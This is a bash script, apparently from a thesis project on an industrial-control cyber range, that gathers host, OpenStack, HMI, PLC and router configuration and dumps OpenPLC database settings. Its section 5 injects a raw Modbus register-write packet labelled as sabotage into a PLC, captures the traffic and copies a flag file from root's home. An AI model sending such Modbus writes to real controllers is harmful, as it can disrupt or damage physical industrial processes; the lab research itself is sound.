#!/bin/bash
# collect_thesis_data.sh
# Automated thesis data collector. Run inside the Vagrant VM as root.

BACKUP_DIR="/vagrant/thesis_data_dumps"
mkdir -p "$BACKUP_DIR"

HMI_IP="192.168.130.16"
PLC_IP="192.168.131.64"
ROUTER_IP="192.168.131.161"
KEY_FILE="/tmp/pool-47.key"
NETNS="qdhcp-1834dfb1-f844-485f-a770-68c2ba62bfe8"

ssh_cmd() {
  sudo ip netns exec "$NETNS" ssh -o StrictHostKeyChecking=no -i "$KEY_FILE" debian@"$1" "$2"
}

echo "=== GATHERING THESIS DATA ==="

# 1. Hypervisor Host specs (for RQ3 overhead/hardware mapping)
echo "Collecting hypervisor host specs..."
lscpu > "$BACKUP_DIR/host_cpu.txt"
free -h > "$BACKUP_DIR/host_ram.txt"
df -h > "$BACKUP_DIR/host_disk.txt"
sudo docker ps > "$BACKUP_DIR/host_containers.txt"
sudo kubectl get pods -A > "$BACKUP_DIR/kubernetes_pods.txt"

source /etc/kolla/admin-openrc.sh
source /root/kolla-ansible-venv/bin/activate
openstack server list --all > "$BACKUP_DIR/openstack_servers.txt"
openstack network list > "$BACKUP_DIR/openstack_networks.txt"
openstack flavor list > "$BACKUP_DIR/openstack_flavors.txt"

# 2. HMI specs & configuration (RQ1 & RQ3)
echo "Collecting HMI specs & configuration..."
ssh_cmd "$HMI_IP" "lscpu" > "$BACKUP_DIR/hmi_cpu.txt"
ssh_cmd "$HMI_IP" "free -h" > "$BACKUP_DIR/hmi_ram.txt"
ssh_cmd "$HMI_IP" "df -h" > "$BACKUP_DIR/hmi_disk.txt"
ssh_cmd "$HMI_IP" "ip a" > "$BACKUP_DIR/hmi_networking.txt"
ssh_cmd "$HMI_IP" "ip route" > "$BACKUP_DIR/hmi_routing.txt"
ssh_cmd "$HMI_IP" "sudo ss -tlnp" > "$BACKUP_DIR/hmi_ports.txt"
ssh_cmd "$HMI_IP" "sudo systemctl status nodered" > "$BACKUP_DIR/hmi_nodered_status.txt"
ssh_cmd "$HMI_IP" "cat /root/.node-red/settings.js" > "$BACKUP_DIR/hmi_nodered_settings.js"

# 3. PLC specs, database & configs (RQ1, RQ2 & RQ3)
echo "Collecting PLC specs, database & configs..."
ssh_cmd "$PLC_IP" "lscpu" > "$BACKUP_DIR/plc_cpu.txt"
ssh_cmd "$PLC_IP" "free -h" > "$BACKUP_DIR/plc_ram.txt"
ssh_cmd "$PLC_IP" "df -h" > "$BACKUP_DIR/plc_disk.txt"
ssh_cmd "$PLC_IP" "ip a" > "$BACKUP_DIR/plc_networking.txt"
ssh_cmd "$PLC_IP" "ip route" > "$BACKUP_DIR/plc_routing.txt"
ssh_cmd "$PLC_IP" "sudo ss -tlnp" > "$BACKUP_DIR/plc_ports.txt"
ssh_cmd "$PLC_IP" "sudo systemctl status openplc" > "$BACKUP_DIR/plc_openplc_status.txt"
ssh_cmd "$PLC_IP" "sudo systemctl status simulation-monitor" > "$BACKUP_DIR/plc_simulation_monitor_status.txt"
ssh_cmd "$PLC_IP" "sqlite3 /opt/OpenPLC_v3/webserver/openplc.db \".schema\"" > "$BACKUP_DIR/plc_openplc_db_schema.txt"
ssh_cmd "$PLC_IP" "sqlite3 /opt/OpenPLC_v3/webserver/openplc.db \"SELECT * FROM settings;\"" > "$BACKUP_DIR/plc_openplc_db_settings.txt"

# 4. Router firewall rules (RQ1 & RQ2)
echo "Collecting Router firewall rules..."
ssh_cmd "$ROUTER_IP" "sudo iptables -t filter -S FORWARD" > "$BACKUP_DIR/router_forward_rules.txt"
ssh_cmd "$ROUTER_IP" "sudo iptables -t nat -S" > "$BACKUP_DIR/router_nat_rules.txt"
ssh_cmd "$ROUTER_IP" "ip route" > "$BACKUP_DIR/router_routing.txt"

# 5. Network Traffic Capture (PCAP)
echo "Setting up network traffic capture (PCAP)..."
# Start tcpdump on PLC node in background to capture 10 packets on port 502
ssh_cmd "$PLC_IP" "sudo timeout 10 tcpdump -i any port 502 -w /tmp/modbus_sabotage.pcap -c 10" &
sleep 2

# Send the Modbus write packet from the HMI VM to the PLC
echo "Injecting Modbus payload from HMI..."
ssh_cmd "$HMI_IP" "python3 -c \"import socket; s=socket.socket(); s.connect(('192.168.99.10',502)); s.sendall(b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x27\x0f'); s.recv(1024); s.close()\""

sleep 3
# Pull the PCAP file from PLC node back to HMI VM or directly copy it
echo "Copying network capture (PCAP)..."
sudo ip netns exec "$NETNS" scp -o StrictHostKeyChecking=no -i "$KEY_FILE" debian@"$PLC_IP":/tmp/modbus_sabotage.pcap "$BACKUP_DIR/modbus_sabotage.pcap"

echo "Copying sabotage flag from PLC..."
ssh_cmd "$PLC_IP" "cat /root/flag2.txt 2>/dev/null" > "$BACKUP_DIR/flag2.txt"

echo "=== GATHERING COMPLETED SUCCESSFULLY ==="
echo "All configurations, log files, SQLite database dumps, and the PCAP packet capture have been saved to /opt/cyber-range/devops-crczp-lite/thesis_data_dumps/"
